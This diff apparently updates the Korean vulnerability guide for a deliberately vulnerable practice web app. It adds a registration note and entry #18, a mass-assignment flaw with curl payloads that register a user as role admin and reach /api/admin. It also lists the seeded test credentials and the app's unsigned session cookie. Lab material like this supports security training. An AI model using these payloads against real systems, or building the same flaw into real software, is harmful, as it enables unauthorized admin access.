@@ -8,6 +8,7 @@
 ## 기본 정보
 
 - 테스트 계정 (DB 시드): `admin` / `admin123`, `alice` / `alice2024`, `bob` / `password`
+- 회원가입: `/register.html` 또는 `POST /api/register`로 계정을 만들 수 있습니다. 가입한 계정은 서버를 재시작하면 사라집니다.
 - 비밀번호 저장 방식: MD5 (솔트 없음). 평문은 위 계정 표와 같습니다.
 - 세션 쿠키: `session=<base64(JSON)>`, JSON은 `{"id", "username", "role"}`. 서명 없음.
 
@@ -135,6 +136,18 @@
 - 위치: `GET /robots.txt`
 - 내용: `Disallow: /admin.html`, `/api/debug`, `/files/`, `/uploads/`. 숨기려던 경로를 직접 알려줍니다.
 
+### 18. 대량 할당 (회원가입 시 권한 지정) — CWE-915
+- 위치: `POST /api/register` (`role` 필드)
+- 원인: 서버가 요청의 `role` 값을 그대로 저장합니다. 기본값은 `user`지만 클라이언트가 바꿀 수 있습니다.
+- 페이로드 예시:
+  ```bash
+  curl -s -X POST http://127.0.0.1:8000/api/register -H 'Content-Type: application/json' \
+    -d '{"username":"evil","password":"p","role":"admin"}'
+  curl -s -i -X POST http://127.0.0.1:8000/api/login -H 'Content-Type: application/json' \
+    -d '{"username":"evil","password":"p"}'   # Set-Cookie의 session 값을 base64 디코딩하면 "role":"admin"
+  ```
+  발급된 `session` 쿠키로 `GET /api/admin`에 접근하면 사용자 목록이 나옵니다.
+
 ## 요약표
 
 | # | 취약점 | 핵심 엔드포인트 | 한 줄 확인 |
@@ -156,3 +169,4 @@
 | 15 | 민감 정보 노출 | `GET /api/debug` | 시크릿 키, 해시 |
 | 16 | 스택 트레이스 노출 | 아무 API 오류 | 500 + stack |
 | 17 | robots.txt 힌트 | `GET /robots.txt` | 숨긴 경로 나열 |
+| 18 | 대량 할당 (가입 시 role) | `POST /api/register` | `role=admin`으로 가입 후 로그인하면 `/api/admin` 접근 |
